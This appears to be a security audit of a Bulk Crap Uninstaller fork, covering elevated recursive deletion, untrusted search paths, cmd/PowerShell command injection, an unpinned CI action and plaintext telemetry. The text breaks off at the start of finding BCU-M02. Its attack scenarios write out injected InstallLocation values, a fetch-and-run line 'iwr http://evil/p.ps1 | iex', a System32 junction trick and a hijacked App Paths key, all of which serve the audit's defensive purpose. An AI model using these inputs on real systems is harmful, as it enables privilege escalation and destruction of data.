# Security Review — Bulk Crap Uninstaller (BCUninstaller) fork

**Target:** `C:\Users\BB-LAB\Documents\Root Project Folder\Moksh`
**Upstream identity:** Bulk Crap Uninstaller v6.2, Apache-2.0, © Marcin Szeniak (Klocman)
**Review date:** 2026-08-13
**Method:** Static analysis only. Nothing was executed, built, installed, or contacted over the network. No application source file was modified.

> ## ⚠ STATUS: SUPERSEDED BY REMEDIATION
>
> This document records the codebase **as originally received**, before any fixes. It is kept
> unedited as the audit record — findings below describe code that no longer exists in this tree.
>
> **All Critical, High, Medium and Low findings have since been addressed.** See
> **[REMEDIATION.md](REMEDIATION.md)** for what was changed, and for the nine items that remain
> outstanding — including the two that matter most: the solution **has not been compiled**, and the
> fork **has not been diffed against upstream**.
>
> The verdict in §16 (*PROCEED WITH REMEDIATION*) has been acted on. Do not read the findings below
> as a description of the current state of the code.

---

## 1. Executive Summary

This is a fork of the well-known open-source Windows uninstaller **Bulk Crap Uninstaller** (BCU). It is a large (~130k LOC) .NET 8 / WinForms desktop application plus nine helper executables and one native C++ launcher.

**No malware, backdoor, dropper, or credential-stealing code was found.** All bundled binaries that ship with the product are Authenticode-signed by their legitimate publishers (verified statically): `es.exe` is signed by *voidtools PTY LTD*, and the bundled `.diagcab` is signed by *Microsoft Corporation*. There is no obfuscation, no encoded payloads, no dynamic assembly loading, no XOR/decrypt-and-run routines, no persistence installation, no clipboard/browser/DPAPI/LSASS access, and no hardcoded secrets.

What *is* present is a substantial and genuine **privileged-operation attack surface**. Every executable in this solution is built with `requestedExecutionLevel level="requireAdministrator"`, so the entire application always runs elevated. Against that backdrop, the review found:

- **2 Critical** issues that allow an *unprivileged* local attacker to cause arbitrary, elevated, recursive file deletion (including via directory junctions), by writing a registry key that any standard user can write.
- **5 High** issues, chiefly untrusted-search-path execution (an elevated process resolves helper executables from the current directory, `PATH`, and **HKCU** — all user-writable), two `cmd.exe` command-injection sinks fed from registry values, and a GitHub Action pinned to a mutable branch that receives a repository secret.
- **7 Medium** issues, including unauthenticated plaintext-HTTP crash reporting and telemetry to a third-party dynamic-DNS host, an Authenticode "valid certificate" indicator that does not actually verify the file signature, an insecure temp-file-and-execute path, and an unrestricted named-pipe control channel in the elevated automation daemon.
- **8 Low** issues.

Critically for your use case: the fork carries **no `.git` directory**, so it cannot be diffed against the upstream repository. Nothing in the code looks tampered with, but *absence of tampering cannot be proven from this working copy alone*. Verifying the fork against upstream is a prerequisite action, not an optional one.

**Verdict: PROCEED WITH REMEDIATION.** See §16.

---

## 2. Architecture

### 2.1 Languages, frameworks, build system

| Aspect | Detail |
|---|---|
| Primary language | C# (565 `.cs` files), `net8.0-windows10.0.18362.0` |
| Native code | C++ (`source/BCU-launcher/main.cpp`) |
| UI framework | Windows Forms (`UseWindowsForms=true`), ObjectListView 2.10 (vendored) |
| Build system | MSBuild / Visual Studio 2022; `source/BulkCrapUninstaller.sln`, 20 project files, shared `source/Directory.Build.props` |
| Package manager | NuGet (`PackageReference`) — **no lock files, no `nuget.config`** |
| Installer | Inno Setup 6.4 (`installer/BcuSetup.iss`) |
| Localisation | 964 `.resx` files, 24 languages |
| CI | GitHub Actions (`.github/workflows/ci.yaml`, `winget.yml`) |
| Release script | `publish.bat` |

### 2.2 Projects

| Project | LOC | Kind | Role |
|---|---|---|---|
| `ObjectListView` | 45,489 | lib | Vendored 3rd-party list control |
| `BulkCrapUninstaller` | 23,318 | **exe** | Main GUI application |
| `UninstallTools` | 16,482 | lib | Core: app discovery, uninstall execution, junk scanning |
| `KlocTools` | 15,556 | lib | Registry/process/path/DISM/WMI helpers |
| `HelperTools` | 12,425 | shared | Win32 result codes, `LogWriter` |
| `NBug_custom` | 9,642 | lib | Vendored crash-reporting framework (NBug 1.2, abandoned upstream) |
| `UninstallerAutomatizer` | 1,474 | **exe** | UI-automation daemon that auto-clicks uninstaller wizards (FlaUI/UIA3) |
| `UniversalUninstaller` | 989 | **exe** | Recursive folder deleter used for apps with no real uninstaller |
| `SteamHelper` | 578 | **exe** | Steam game enumeration/removal |
| `WinUpdateHelper` | 496 | **exe** | Windows Update removal (WUApiLib COM) |
| `ScriptHelper` | 456 | **exe** | Windows "tweak" reversal via registry writes |
| `BCU-console` | 403 | **exe** | Unattended CLI front-end |
| `PortableSettingsProvider` | 328 | lib | Portable settings persistence |
| `OculusHelper` | 320 | **exe** | Oculus app removal, `OVRService` control |
| `StoreAppHelper` | 288 | **exe** | UWP/Store app removal (`PackageManager`) |
| `BCU-launcher` | (C++) | **exe** | Arch-selecting shim → `win-x64\BCUninstaller.exe` |

### 2.3 Entry points

| Entry point | File |
|---|---|
| `EntryPoint.Main` (GUI, `[STAThread]`) | `source/BulkCrapUninstaller/EntryPoint.cs:33` |
| `Program.Main` (CLI) | `source/BCU-console/Program.cs` |
| `Program.Main` (deleter) | `source/UniversalUninstaller/Program.cs:26` |
| `Program.Main` (automation) | `source/UninstallerAutomatizer/Program.cs:24` |
| `Program.Main` (helpers ×5) | `Steam/Store/WinUpdate/Oculus/Script Helper/Program.cs` |
| `main()` (native) | `source/BCU-launcher/main.cpp:89` |
| Installer entry | `installer/BcuSetup.iss` → `InitializeSetup` |
| Build entry | `publish.bat` |

### 2.4 Repository execution map

```
USER  (must be a local Administrator — every EXE is requireAdministrator)
  │
  │  double-click / Start menu / `BCU-console ... /U` (unattended)
  ▼
BCUninstaller.exe        ← BCU-launcher.exe shim picks win-x64 / win-x86
  │  EntryPoint.Main → NBugConfigurator.SetupNBug() → LogWriter → MainWindow
  │  Directory.SetCurrentDirectory(app dir)          ⚠ CWD = app dir
  │
  ├── DISCOVERY (read)  ──────────────────────────────────────────────
  │     RegistryFactory       HKLM + **HKCU** \...\Uninstall  ⚠ user-writable source
  │     DirectoryFactory      Program Files, %APPDATA%, %LOCALAPPDATA%
  │     StoreAppFactory ─────► StoreAppHelper.exe   (Windows.Management.Deployment)
  │     SteamFactory    ─────► SteamHelper.exe
  │     WindowsFeature  ─────► Dism.exe  (%SYSTEM%\Dism.exe, fully qualified ✓)
  │     WindowsUpdate   ─────► WinUpdateHelper.exe (WUApiLib COM)
  │     OculusFactory   ─────► OculusHelper.exe    (ServiceController "OVRService")
  │     ChocolateyFactory ───► choco.exe    ⚠ resolved via CWD → PATH → HKCU App Paths
  │     ScoopFactory    ─────► powershell.exe -ex unrestricted <scoop.ps1>  ⚠ same
  │     ScriptHelper    ─────► ScriptHelper.exe   (registry tweak state)
  │     FastSizeGenerator ──► es.exe (voidtools, signed) + Scripting.FileSystemObject (COM)
  │     CertificateGetter ──► X509Certificate2(file).Verify()   ⚠ chain only, not signature
  │
  ├── UNINSTALL (write) ──────────────────────────────────────────────
  │     SystemRestore.BeginSysRestore()             → restore point
  │     RunExternalCommands(pre)                    → user-configured commands
  │     UninstallManager.RunUninstaller()
  │         ├─ ProcessTools.SeparateArgsFromCommand(UninstallString)  ⚠ heuristic parse
  │         ├─ UseShellExecute = true → Process.Start(...)             ⚠ registry-controlled
  │         ├─ NSIS: File.Copy(uninstaller → %TEMP%) then execute      ⚠ CWE-377
  │         ├─ MSI:  MsiExec.exe /X{guid}                              ✓ GUID-typed
  │         └─ SimpleDelete: UniversalUninstaller.exe /Q "<InstallLocation>"
  │                          └──► RECURSIVE DELETE, no path allowlist, follows junctions ⚠⚠
  │     BulkUninstallTask ──named pipe "UninstallAutomatizerDaemon"──► UninstallerAutomatizer.exe
  │                          └──► UI Automation clicks Next/Yes/Uninstall in target windows ⚠
  │     RunExternalCommands(post)
  │
  ├── JUNK CLEANUP (write/delete) ────────────────────────────────────
  │     FileSystemJunk.Delete()   → Recycle Bin (Microsoft.VisualBasic.FileIO) ✓ reversible
  │     RegistryKeyJunk.Delete()  → DeleteSubKeyTree (optional .reg backup via regedit.exe /e)
  │     RegistryValueJunk.Delete() → incl. **Windows Firewall rules** (HKLM\...\FirewallRules)
  │     RunProcessJunk.Delete()   → Process.Start(...)   ⚠ "cleanup" that executes a process
  │     StartupJunkNode.Delete()  → Run/RunOnce keys, Startup folder, services, scheduled tasks
  │     ProgramFilesOrphans       → suggests deleting unmatched Program Files subfolders
  │
  ├── TOOLS (write) ──────────────────────────────────────────────────
  │     TakeOwnership → cmd.exe /c takeown && icacls <path> /grant administrators:F ⚠ injection
  │     OpenRegKeyInRegedit → HKCU LastKey + Process.Start("regedit.exe")  ⚠ unqualified
  │     StartLogCleaner → cmd.exe /c start /min CleanLogs.bat              ⚠ unqualified
  │
  └── NETWORK (egress) ───────────────────────────────────────────────
        NBug crash reports  ──► http://bugsklocman.ddns.net:7721/SendCrashReport   ⚠ plaintext
        Usage statistics    ──► http://bugsklocman.ddns.net:7721/SendStats         (opt-in)
        App ratings up/down ──► http://bugsklocman.ddns.net:7721/Get*/SetUserRating (opt-in)
        Update check        ──► https://github.com/.../releases/latest (HEAD redirect)
        "Look up online"    ──► browser → google / filehippo / sourceforge / fosshub /
                                 alternativeto / github / slant  (explicit user action)
        Installer only      ──► https://download.visualstudio.microsoft.com/... (.NET 8 runtime)
                                                                      ▼
                          OS / REGISTRY / FILESYSTEM / SERVICES / NETWORK
                          (all reached with Administrator token)
```

---

## 3. Attack Surface

| # | Surface | Trust boundary | Notes |
|---|---|---|---|
| 1 | `HKCU\Software\Microsoft\Windows\CurrentVersion\Uninstall` | **Untrusted** — writable by any standard user, no elevation | Feeds `InstallLocation`, `UninstallString`, `QuietUninstallString`, `DisplayName`, `ModifyPath` straight into elevated process launches and deletions |
| 2 | `HKCU\...\App Paths` | **Untrusted** — user-writable | Consulted as an executable-resolution fallback (`PathTools.cs:135`) |
| 3 | `PATH` + current directory | **Untrusted** for portable installs | `choco.exe`, `scoop.cmd`, `scoop.ps1`, `cmd.exe`, `regedit.exe`, `CleanLogs.bat` |
| 4 | Filesystem layout under scanned dirs | Untrusted | Directory names, junctions, reparse points, app manifests, scoop JSON |
| 5 | `UninstallAutomatizerDaemon` named pipe | Same-user, cross-integrity-level | Accepts arbitrary PIDs, no `PipeOptions.CurrentUserOnly` |
| 6 | `UniversalUninstaller.exe` command line | Untrusted if invocable | Elevated recursive delete of any path |
| 7 | `http://bugsklocman.ddns.net:7721` responses | **Untrusted** — plaintext HTTP, third-party DDNS | Base64 → Brotli → JSON decoded client-side |
| 8 | `.bcul` uninstall lists | Untrusted (shared/downloaded files) | XML deserialisation (DTD prohibited ✓), unbounded regex ✗ |
| 9 | Installer `{tmp}` directory | Contextually untrusted | Pre-existing filename suppresses download; downloaded EXE run with empty checksum |
| 10 | GitHub Actions workflows | Supply chain | Unpinned actions, one holds a secret |
| 11 | NuGet restore | Supply chain | No lock file, two floating version ranges |

---

## 4. Critical Findings

### BCU-C01 — Arbitrary elevated recursive directory deletion via a user-writable registry key

| | |
|---|---|
| **ID** | BCU-C01 |
| **Severity** | **Critical** |
| **CWE** | CWE-73 (External Control of File Name or Path), CWE-269 (Improper Privilege Management) |
| **Files** | `source/UninstallTools/Factory/InfoAdders/UninstallerTypeAdder.cs:32`<br>`source/UninstallTools/Factory/InfoAdders/SimpleDeleteUninstallStringGenerator.cs:70`<br>`source/UniversalUninstaller/Program.cs:47` |

**Code**

`UninstallerTypeAdder.cs:32-36` — any registry uninstall entry that has an `InstallLocation` but no uninstall command is silently reclassified as a "delete the folder" entry:

```csharp
else if (!string.IsNullOrEmpty(target.InstallLocation))
{
    // We don't have a valid uninstaller, so tell simple delete adder to do its job and make our own
    target.UninstallerKind = UninstallerType.SimpleDelete;
}
```

`SimpleDeleteUninstallStringGenerator.cs:70-75` — the deletion command is then synthesised with no validation of `installLocation`:

```csharp
private static string GetNewUninstallString(string installLocation, bool quiet)
{
    return quiet
        ? $"\"{UniversalUninstallerFilename.FullName}\" /Q \"{installLocation}\\\""
        : $"\"{UniversalUninstallerFilename.FullName}\" \"{installLocation}\\\"";
}
```

`UniversalUninstaller/Program.cs:47-104` — the deleter accepts one path argument and, with `/q`, deletes it recursively. There is **no** allowlist, **no** denylist, **no** `IsSystemDirectory` check, and **no** check that the path is inside Program Files or any app directory:

```csharp
dir = new DirectoryInfo(strings.Single().Trim(' ', '"'));
...
if (_quietMode) { DeleteItems(new[] {dir}); }
```

`source/Directory.Build.props:25` applies `..\app.manifest` (`requireAdministrator`) to every project, so `UniversalUninstaller.exe` always runs elevated.

**Attack scenario**

1. A standard (non-admin) user or any medium-integrity malware writes:
   `HKCU\Software\Microsoft\Windows\CurrentVersion\Uninstall\FreeGame`
   with `DisplayName = "Free Game"` and `InstallLocation = "C:\Windows\System32\drivers"`. No elevation is required — HKCU is writable by its owner.
2. `RegistryFactory` scans **both** HKLM and HKCU (`RegistryFactory.cs:288-289`) and surfaces the entry as an ordinary application.
3. Because there is no `UninstallString`, `UninstallerTypeAdder` marks it `SimpleDelete` and BCU generates
   `"…\UniversalUninstaller.exe" /Q "C:\Windows\System32\drivers\"`.
4. An administrator runs BCU (which auto-elevates) and uninstalls the entry — trivially likely during a bulk cleanup of dozens of entries, and fully automatic under `BCU-console uninstall list.bcul /U`.
5. `C:\Windows\System32\drivers` is recursively deleted with Administrator rights.

`ApplicationUninstallerEntry.IsInstallLocationValid()` (`:333-338`) is the only related check and rejects only an *exact* match against a Program Files root — `C:\Windows\System32\drivers` passes.

**Impact**

Local unprivileged → SYSTEM-adjacent destructive impact: unbootable OS, destruction of arbitrary data, or targeted deletion of security tooling (EDR agent directories, log stores) as a precursor to further attack. Deletion is permanent — `UniversalUninstaller` deletes directly via `FileSystemInfo.Delete()`, **not** to the Recycle Bin, unlike the junk-removal path.

**Recommendation**

1. In `UniversalUninstaller/Program.cs`, before deleting, canonicalise with `Path.GetFullPath` and refuse any target that: is a drive root; is or contains `%WINDIR%`, `%SYSTEMROOT%`, `%ProgramFiles%`, `%ProgramFiles(x86)%`, `%ProgramData%`, `%USERPROFILE%` themselves (as opposed to a subfolder of them); is a known folder (`UninstallToolsGlobalConfig.KnownFolderList`); or has `FileAttributes.System`.
2. Require the target to be at least *N* levels below a recognised install root, and refuse paths shorter than that.
3. Gate `SimpleDelete` generation in `UninstallerTypeAdder.cs` on `!UninstallToolsGlobalConfig.IsSystemDirectory(target.InstallLocation)`.
4. Treat HKCU-sourced entries as lower-trust than HKLM ones and require an explicit extra confirmation showing the resolved absolute path before any `SimpleDelete` runs.
5. Delete to the Recycle Bin (as the junk path already does) rather than permanently, where size permits.

---

### BCU-C02 — Recursive delete follows directory junctions and symlinks

| | |
|---|---|
| **ID** | BCU-C02 |
| **Severity** | **Critical** |
| **CWE** | CWE-59 (Improper Link Resolution Before File Access — 'Link Following') |
| **File** | `source/UniversalUninstaller/Program.cs:104-138` |

**Code**

```csharp
public static void RecursiveDelete(DirectoryInfo baseDir)
{
    if (!baseDir.Exists) return;

    foreach (var info in baseDir.GetFileSystemInfos())
    {
        ClearReadOnlyFlag(info);

        if (info is DirectoryInfo dir)
            RecursiveDelete(dir);          // ← no ReparsePoint check
        else
            info.Delete();
    }

    ClearReadOnlyFlag(baseDir);
    WaitForDirEmpty(baseDir);
    baseDir.Delete();
}

private static void ClearReadOnlyFlag(FileSystemInfo info)
{
    info.Attributes &= ~FileAttributes.ReadOnly;   // ← applied through the link
}
```

A repository-wide search confirms the codebase contains **no** occurrence of `ReparsePoint`, `LinkTarget`, `IsSymbolicLink`, or any junction handling in any deletion path.

`DirectoryInfo.GetFileSystemInfos()` on a junction enumerates the *target's* contents, so the recursion descends through the link and deletes the target's files, then attempts to remove the link.

**Attack scenario**

1. A standard user has write access to any directory that BCU will delete — e.g. an app folder under `%LOCALAPPDATA%\Programs\SomeApp`, or a folder they control referenced by an HKCU entry as in BCU-C01.
2. They create a junction inside it: `mklink /J "…\SomeApp\data" "C:\Windows\System32"`. Creating a *junction* (unlike a symlink) requires no special privilege.
3. An administrator uninstalls the app. `RecursiveDelete` descends through `data\` into `System32` and deletes its contents with Administrator rights.

This also composes with `ClearReadOnlyFlag`, which strips the read-only attribute from files reached through the link before deleting them.

**Impact**

Elevated arbitrary file deletion reachable without the registry-write step of BCU-C01, from any directory the attacker can write to that the administrator later cleans up. Same destructive and defence-evasion impact.

**Recommendation**

In `RecursiveDelete`, skip traversal of any entry whose attributes include `FileAttributes.ReparsePoint` — delete the link itself and do not recurse:

```csharp
if (info is DirectoryInfo dir)
{
    if ((dir.Attributes & FileAttributes.ReparsePoint) != 0) { dir.Delete(); continue; }
    RecursiveDelete(dir);
}
```

Also verify at each level that the resolved path is still inside the original root, to defeat directory swaps mid-walk. Apply the same guard to `ClearReadOnlyFlag`. Consider using `Microsoft.VisualBasic.FileIO.FileSystem.DeleteDirectory` (which the junk path already uses and which delegates to the shell) instead of hand-rolled recursion.

---

## 5. High Findings

### BCU-H01 — Elevated process resolves helper executables from user-writable locations (CWD, PATH, HKCU)

| | |
|---|---|
| **ID** | BCU-H01 |
| **Severity** | High |
| **CWE** | CWE-426 (Untrusted Search Path), CWE-427 (Uncontrolled Search Path Element), CWE-15 (External Control of System Setting) |
| **Files** | `source/KlocTools/Tools/PathTools.cs:125-143`<br>`source/UninstallTools/Factory/ChocolateyFactory.cs:19`<br>`source/UninstallTools/Factory/ScoopFactory.cs:56,80-95` |

**Code**

```csharp
public static string GetFullPathOfExecutable(string filename)
{
    IEnumerable<string> paths = new[] { Environment.CurrentDirectory };   // ← 1. CWD first
    var pathVariable = Environment.GetEnvironmentVariable("PATH");
    if (pathVariable != null) paths = paths.Concat(pathVariable.Split(';')); // ← 2. PATH
    var combinations = paths.Select(x => Path.Combine(x, filename));
    return combinations.FirstOrDefault(File.Exists) ?? GetExecutablePathFromAppPaths(filename);
}

private static string GetExecutablePathFromAppPaths(string exename)
{
    const string appPaths = @"Software\Microsoft\Windows\CurrentVersion\App Paths";
    var executableEntry = Path.Combine(appPaths, exename);
    using (var key = Registry.CurrentUser.OpenSubKey(executableEntry)   // ← 3. HKCU, user-writable
                     ?? Registry.LocalMachine.OpenSubKey(executableEntry))
    {
        return key?.GetStringSafe(null);
    }
}
```

Callers that reach process execution:
- `ChocolateyFactory.cs:19` → `GetFullPathOfExecutable("choco.exe")` → `StartProcessAndReadOutput(chocoPath, …)`
- `ScoopFactory.cs:80` → `GetFullPathOfExecutable("scoop.cmd" / "scoop.ps1")`
- `ScoopFactory.cs:56` → `GetFullPathOfExecutable("powershell.exe")`

All three run **automatically during the application list refresh**, with no user interaction beyond starting BCU.

**Attack scenario**

*Path A — HKCU App Paths (no file placement needed):* An unprivileged process running as the administrator's own account writes
`HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\choco.exe` → `(Default) = C:\Users\Public\payload.exe`.
Chocolatey does not need to be installed. On the next BCU launch the elevated process resolves and executes `payload.exe` with an Administrator token. This is a clean UAC-bypass primitive: a medium-integrity process seeds a value that a high-integrity process reads and executes.

*Path B — current directory:* `EntryPoint.Main` sets the working directory to the application directory (`EntryPoint.cs:41`). For **portable** BCU (documented and distributed — extracted to Downloads, a USB stick, or a shared folder), that directory is user-writable, so a `choco.exe` or `scoop.cmd` dropped alongside `BCUninstaller.exe` is executed elevated.

*Path C — PATH:* The user portion of `PATH` lives in `HKCU\Environment` and is user-writable without elevation.

**Impact**

Local privilege escalation / UAC bypass to full Administrator. Requires no exploit primitive beyond a registry value write.

**Recommendation**

- Remove the `Environment.CurrentDirectory` entry and the `HKCU` App Paths fallback entirely; consult only `HKLM` App Paths, or drop App Paths altogether.
- Resolve `powershell.exe` from `%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe` explicitly (the pattern `DismTools.cs:19` already uses correctly for `Dism.exe`).
- Before executing any discovered third-party tool from an elevated context, require that the resolved path is not writable by non-administrators (check the DACL), or verify its Authenticode signature.

---

### BCU-H02 — Command injection in "Take ownership" (`cmd.exe` string concatenation from registry data)

| | |
|---|---|
| **ID** | BCU-H02 |
| **Severity** | High |
| **CWE** | CWE-78 (OS Command Injection) |
| **File** | `source/BulkCrapUninstaller/Forms/Windows/MainWindow.cs:558-561` |

**Code**

```csharp
private static void TakeOwnership(string directoryPath)
{
    PremadeDialogs.StartProcessSafely("cmd.exe",
        $"/c takeown /f \"{directoryPath}\" && icacls \"{directoryPath}\" /grant administrators:F && pause");
}
```

`directoryPath` is populated at `MainWindow.cs:549-554` directly from `x.InstallLocation` and `x.UninstallerLocation` — i.e. from registry values, with no escaping or validation.

**Attack scenario**

A standard user creates an HKCU uninstall entry with
`InstallLocation = C:\Temp\a" & powershell -enc <base64> & rem "`.
When an administrator selects that entry and uses *Advanced operations → Take ownership*, `cmd.exe` parses the injected `&` operators and executes the attacker's command with an Administrator token. `cmd.exe` performs no backslash-escaping of quotes, so a single embedded `"` is sufficient to break out.

**Impact**

Arbitrary elevated command execution. Requires one administrator click, on a menu item whose label is the attacker-supplied path — which can be padded with whitespace so the injected portion is not immediately visible in a narrow menu.

**Recommendation**

Do not shell out. Use `System.Security.AccessControl` (`DirectorySecurity.SetOwner` / `AddAccessRule`) with `SeTakeOwnershipPrivilege` enabled. If shelling out must be retained, invoke `takeown.exe` and `icacls.exe` as separate `ProcessStartInfo` calls with `UseShellExecute = false` and `ArgumentList`, never through `cmd.exe`, and reject any path containing `"`, `&`, `|`, `<`, `>`, `^`, or `%`.

---

### BCU-H03 — Command injection in the legacy simple-delete uninstall string

| | |
|---|---|
| **ID** | BCU-H03 |
| **Severity** | High |
| **CWE** | CWE-78 (OS Command Injection) |
| **File** | `source/UninstallTools/Factory/InfoAdders/SimpleDeleteUninstallStringGenerator.cs:77-82` |

**Code**

```csharp
private static string GetOldSimpleDeleteString(string installLocation, bool quiet)
{
    return quiet
        ? $"cmd.exe /C del /F /S /Q \"{installLocation}\\\""
        : $"cmd.exe /C del /S \"{installLocation}\\\" && pause";
}
```

This is the fallback used whenever `UniversalUninstaller.exe` is missing from the application directory (`:21`, `:42-51`) — which is exactly the case for a partially-extracted portable install or a custom build that omits that project.

**Attack scenario**

Same registry-write primitive as BCU-C01. `InstallLocation = C:\Temp\x" & calc.exe & "` yields
`cmd.exe /C del /S "C:\Temp\x" & calc.exe & "\" && pause`, executing `calc.exe` (stand-in for arbitrary payload) with the elevated token when the administrator uninstalls the entry.

**Impact**

Arbitrary elevated command execution during a routine uninstall operation.

**Recommendation**

Delete this fallback and make `UniversalUninstaller.exe` a hard requirement — if it is absent, mark the entry as "no uninstall method available" rather than synthesising a shell command. If the fallback is kept, reject any `installLocation` containing shell metacharacters before building the string.

---

### BCU-H04 — PowerShell execution-policy bypass with unquoted, path-controlled arguments (Scoop)

| | |
|---|---|
| **ID** | BCU-H04 |
| **Severity** | High |
| **CWE** | CWE-78 (OS Command Injection), CWE-426 (Untrusted Search Path) |
| **File** | `source/UninstallTools/Factory/ScoopFactory.cs:414-418`, `:36-52`, `:105-120` |

**Code**

```csharp
private static ProcessStartCommand MakeScoopCommand(string scoopArgs)
{
    return new ProcessStartCommand(_powershellPath,
        $"-NoProfile -ex unrestricted \"{_scriptPath}\" {scoopArgs}");
}
```

Two separate problems:

1. **`_scriptPath` is attacker-influenceable.** It is derived from the `SCOOP` / `SCOOP_GLOBAL` environment variables (`:38-45`), from `scoop.cmd`/`scoop.ps1` found via `GetFullPathOfExecutable` (`:80-95`, see BCU-H01), or from a JSON config file whose `RootPath` is passed through `Environment.ExpandEnvironmentVariables` (`:115-118`). All three are user-controlled. The resulting script is then run with `-ex unrestricted`, explicitly disabling PowerShell's execution policy, inside an Administrator process.

2. **`scoopArgs` is interpolated unquoted.** `ScoopFactory.cs:393` builds `"uninstall " + name` where `name` comes from `scoop export` output or from directory names under the scoop root. Because the invocation does not use `-File`, PowerShell treats everything after the script path as a **command line**, so `;` is a statement separator. `;` is a legal Windows filename character.

**Attack scenario**

A user (or malware running as the user) sets `HKCU\Environment\SCOOP` to a directory they control containing `shims\scoop.ps1`. On the next elevated BCU launch, that script is executed with `-ex unrestricted` as Administrator during the routine application scan — no user interaction at all. Alternatively, a scoop app directory named `foo; iwr http://evil/p.ps1 | iex` injects a second PowerShell statement into the generated uninstall command.

**Impact**

Local privilege escalation to Administrator with no user interaction beyond launching BCU.

**Recommendation**

- Resolve `powershell.exe` from an absolute system path.
- Refuse to execute `scoop.ps1` if the resolved script or any parent directory is writable by non-administrators.
- Invoke with `-File "<script>"` and pass each argument via `ProcessStartInfo.ArgumentList` so PowerShell treats them as literal parameters rather than as a command.
- Reject scoop app names containing `;`, `|`, `&`, `` ` ``, `$`, `(`, or whitespace.

---

### BCU-H05 — Release workflow uses an unpinned third-party action and hands it a repository secret

| | |
|---|---|
| **ID** | BCU-H05 |
| **Severity** | High |
| **CWE** | CWE-1357 (Reliance on Insufficiently Trustworthy Component), CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) |
| **File** | `.github/workflows/winget.yml:15-19` |

**Code**

```yaml
      - uses: vedantmgoyal9/winget-releaser@main
        with:
          identifier: Klocman.BulkCrapUninstaller
          version: ${{ steps.get-version.outputs.version }}
          token: ${{ secrets.WINGET_TOKEN }}
```

The action is pinned to the mutable branch `main`, not to a commit SHA or an immutable release tag. Whatever code sits on that branch at trigger time runs in the workflow and is handed `secrets.WINGET_TOKEN` — a GitHub PAT with write access to a winget-pkgs fork, i.e. a credential that can publish packages consumed by `winget install`.

**Attack scenario**

An attacker who compromises the `vedantmgoyal9/winget-releaser` repository (or its maintainer's account) pushes a commit to `main`. The next time this repository publishes a release, the malicious action executes with the token in its environment and exfiltrates it. The attacker then publishes a trojanised BCUninstaller manifest to winget, which reaches every user who runs `winget upgrade`.

**Impact**

Downstream supply-chain compromise of every winget consumer of the package, plus loss of the PAT.

Note a secondary correctness bug in the same file: line 13 assigns `version=$(...)` but line 14 echoes `$VERSION` (unset), so `steps.get-version.outputs.version` is always empty.

**Recommendation**

- Pin to a full commit SHA: `vedantmgoyal9/winget-releaser@<40-char-sha>`, and update it deliberately via Dependabot.
- Add an explicit least-privilege `permissions:` block to the job.
- Scope `WINGET_TOKEN` to the minimum required repository and rotate it.
- Move the publish step behind a protected GitHub Environment requiring manual approval.
- If you fork this project for a product, delete `winget.yml` outright unless you intend to publish to winget yourself.

---

## 6. Medium Findings

### BCU-M01 — Crash reports, telemetry and ratings sent over plaintext HTTP to a third-party dynamic-DNS host

| | |
|---|---|
| **ID** | BCU-M01 |
| **Severity** | Medium |
| **CWE** | CWE-319 (Cleartext Transmission of Sensitive Information), CWE-494 (Download of Code Without Integrity Check), CWE-598 (Sensitive Data in Query String) |
| **Files** | `source/BulkCrapUninstaller/Program.cs:61,281-289`<br>`source/BulkCrapUninstaller/NBugConfigurator.cs:59-78`<br>`source/BulkCrapUninstaller/Functions/Tracking/DatabaseStatSender.cs:24-28`<br>`source/BulkCrapUninstaller/Functions/Ratings/UninstallerRatingManager.cs:31-73` |

**Code**

```csharp
public static Uri ConnectionString { get; } = Debugger.IsAttached
    ? new Uri(@"http://localhost:7721")
    : new Uri(@"http://bugsklocman.ddns.net:7721");
```

```csharp
var compressed = CompressionTools.BrotliCompress(data);
using var s = Program.HomeServerClient;
var result = s.PostAsync(new Uri(
    $"SendCrashReport?userId={Properties.Settings.Default.MiscUserId}&data={Convert.ToBase64String(compressed)}",
    UriKind.Relative), null!).Result;
```

```csharp
var txt = cl.GetStringAsync(new Uri(@"GetAverageRatingsComp", UriKind.Relative)).Result.Trim('"');
var bytes = Convert.FromBase64String(txt);
var remoteAvgRatings = Utils.DecompressAndDeserialize<List<Utils.AverageRatingEntry>>(bytes, options);
```

Three distinct issues:

1. **No transport security.** All four endpoints are `http://` on port 7721, to `bugsklocman.ddns.net` — a *dynamic DNS* hostname, meaning the IP is controlled by whoever currently holds that DDNS record, and the name could be re-registered if the upstream author lets it lapse.
2. **Payload in the URL query string.** The Brotli-compressed, Base64-encoded crash report and statistics blob is placed in the query string of a POST rather than in the body. Query strings are logged by proxies, reverse proxies, and server access logs.
3. **Attacker-controlled response is decompressed and deserialised.** `FetchRatings` Base64-decodes, Brotli-decompresses, and JSON-deserialises a plaintext-HTTP response with no size cap — an on-path attacker (or the DDNS holder) can serve a decompression bomb or malformed input to a process running as Administrator.

**Data actually transmitted:** the crash report is `Report.ToString()` + `SerializableException.ToString()` — exception type and message, full stack traces, `TargetSite`, host application name/version, CLR version, timestamp, plus `BugReportExtraInfo` (64-bit flag, installed UI locale, `Environment.OSVersion.VersionString`). In an uninstaller, stack traces and exception messages routinely embed **full filesystem paths containing the Windows account name** and the names of installed applications. `PrivacyPolicy.txt` states the collected information "is not personally identifiable" — that claim does not hold for crash-report stack traces.

**Opt-in status:** usage statistics (`MiscSendStatistics`), ratings (`MiscUserRatings`), and update checks (`MiscCheckForUpdates`) all default to **`False`** in `Settings.settings` and are presented on the first-start wizard — that part is correct. However, **`NBugConfigurator.SetupNBug()` is called unconditionally at `EntryPoint.Main:35`** and is not gated by any privacy setting; it is only gated by NBug's own `UIMode.Full` send/don't-send dialog.

**Attack scenario**

An attacker on the same network (café Wi-Fi, compromised router) or in a position to influence DNS observes crash reports in cleartext, learning the target's username, OS build, installed software inventory, and internal directory structure — useful reconnaissance. The same position allows serving a hostile ratings response to an Administrator-token process.

**Impact**

Information disclosure of host and user data; a hostile-input path into an elevated process; and, for you specifically, an undisclosed egress channel to a third party's personal server that would ship in your product.

**Recommendation**

For a forked product this is not a "fix", it is a **removal**: strip `NBugConfigurator`, `DatabaseStatSender`, `UsageManager`, and `UninstallerRatingManager`, or repoint them at infrastructure you control. If any telemetry is retained: use HTTPS with certificate validation, move payloads into the request body, gate crash reporting behind the same opt-in as statistics, cap and validate decompressed response sizes, and rewrite `PrivacyPolicy.txt` to accurately describe stack-trace contents.

---

### BCU-M02 — NSIS uninstaller is copied to `%TEMP%` under a predictable name and executed

| | |
|---|---|
| **ID** | BCU-M02 |
| **Severity** | Medium |
